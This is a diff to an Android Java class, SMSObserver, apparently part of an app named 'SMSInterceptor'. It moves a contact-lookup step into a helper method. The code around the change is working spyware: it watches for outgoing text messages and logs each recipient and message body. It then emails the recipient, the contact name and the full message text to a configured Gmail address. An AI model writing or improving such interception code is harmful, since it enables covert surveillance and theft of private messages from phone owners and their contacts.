@@ -52,6 +52,20 @@ public class SMSObserver extends ContentObserver {
 
   }
 
+  public String endPoint(final String number, Context context) {
+
+    String end_point;
+    final String contact_name  = contact.getContactName(number, context);
+
+    if(!contact_name.isEmpty()) {
+      end_point = "" + number + "(" + contact_name + ")";
+    }
+    else {
+      end_point = number;
+    }
+    return end_point;
+  }
+
   @Override
   public void onChange(boolean selfChange) {
     super.onChange(selfChange);
@@ -110,21 +124,16 @@ public class SMSObserver extends ContentObserver {
 
       final String body = cursor.getString(cursor.getColumnIndex("body"));
       final String addr = cursor.getString(cursor.getColumnIndex("address"));
-      final String con  = contact.getContactName(addr,context);
 
-      if(!con.isEmpty()) {
-        endPoint = "" + addr + "(" + con + ")";
-      }
-      else {
-        endPoint = addr;
-      }
-
-      Log.i(TAG, "onChange() id: " + id + ", InitId: " + initId + ", type: " + type + ", body: " + body + ", addr: " + endPoint);
-	
       //if(!(String.valueOf(initId)).equals(id)) && type.equals("2")) {
       if(!initId.equals(id) && type.equals("2")) {
         initId = id;
         Log.d(TAG, "Ougoing text message sent!");
+        Log.i(TAG, "onChange() id: " + id + ", InitId: " +
+                                       initId + ", type: " +
+                                       type + ", body: " +
+                                       body + ", addr: " +
+                                       endPoint(addr, context));
         new Thread(new Runnable() {
 
           @Override
@@ -132,7 +141,8 @@ public class SMSObserver extends ContentObserver {
             try {
               if(gmailEmailString != "null") {
                 sender = new GmailSender();
-                sender.sendMail("SMSInterceptor", "OUTGOING SMS!\n" + "Sent to: " + endPoint + "\nbody:\n" + body, gmailEmailString);
+                sender.sendMail("SMSInterceptor",
+                "OUTGOING SMS!\n" + "Sent to: " + endPoint(addr, context) + "\nbody:\n" + body, gmailEmailString);
               }
             }
             catch(Exception e) {
